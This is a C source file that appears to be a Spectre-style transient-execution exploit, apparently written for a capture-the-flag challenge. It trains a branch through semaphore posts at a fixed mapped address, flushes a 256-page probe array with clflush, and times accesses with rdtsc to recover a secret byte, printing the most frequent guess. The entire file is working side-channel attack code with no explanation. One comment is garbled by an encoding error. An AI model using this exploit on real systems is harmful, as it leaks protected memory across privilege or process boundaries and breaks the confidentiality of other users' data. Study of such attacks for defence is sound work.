#define _GNU_SOURCE
#include <sched.h>
#include <semaphore.h>
#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <x86intrin.h>
#include <string.h>
#define base 0x1337000
#define threshold 200

unsigned long long cnt[256];
void prework()
{
	for (int i=0;i<256;i++)
	{
		_mm_clflush((void *)(base+0x1000*(i+1)));
	}
}
int main() {
	memset((void *)(base+0x1000),0,0x100000);
    sem_t *sem = (sem_t *)0x1337000;   // ÐÅºÅÁ¿
    int *index=(int*)(sem+1),cpuid=1,val=0;
    int fd=open("c",6);
	read(fd,&val,1);
    read(fd,&cpuid,1);
    cpu_set_t set;
	CPU_ZERO(&set);
	CPU_SET(cpuid,&set);
	sched_setaffinity(0, sizeof(set), &set);
    printf("Index is:%d,cpuid is:%d",val,cpuid);
    for (int _=0;_<100;_++)
    {
	    int mn=threshold,id=-1;
	    for (int i=0;i<256;i++)
	    {
	    	*index=258;
	    	prework();
	    	for (int j=0;j<10;j++)
	    	{
	    		sem_post(sem);
			}
			*index=val;
			prework();
			sem_post(sem);
	    	int j=(i*167+13)&0xFF;
	    	unsigned long long start=__rdtsc();
	    	volatile unsigned long long x=*(volatile unsigned long long *)(base+0x1000*(j+1));
	    	_mm_mfence();
	    	unsigned long long end=__rdtsc();
	   		if (end-start<mn)
	   		{
	   			mn=end-start;id=j;
			}
		}
		if (id!=-1)
		{
			printf("%d\n",mn);
			cnt[id]++;
		}
	}
	int mx=0,id=-1;
	for (int i=0;i<256;i++)
	{
		printf("%d: %d\n",i,cnt[i]);
		if (cnt[i]>mx)
		{
			mx=cnt[i];id=i;
		}
	}
	printf("Answer is:%d: %d\n",id,cnt[id]);
    return 0;
}
